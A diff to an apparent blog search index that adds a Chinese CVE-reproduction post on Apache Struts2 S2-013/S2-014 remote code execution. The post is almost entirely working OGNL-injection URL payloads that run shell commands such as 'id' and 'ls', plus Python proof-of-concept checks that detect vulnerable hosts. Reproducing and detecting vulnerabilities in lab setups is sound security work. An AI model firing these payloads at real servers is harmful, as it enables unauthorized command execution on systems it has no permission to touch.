@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>S2-013_S2-014远程代码执行漏洞</title>
+      <link href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p><pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// 或link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><p>S2-014</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/">https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cve复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cve复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Tomcat PUT方法任意写文件漏洞CVE-2017-12615</title>
       <link href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/"/>
       <url>/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/</url>
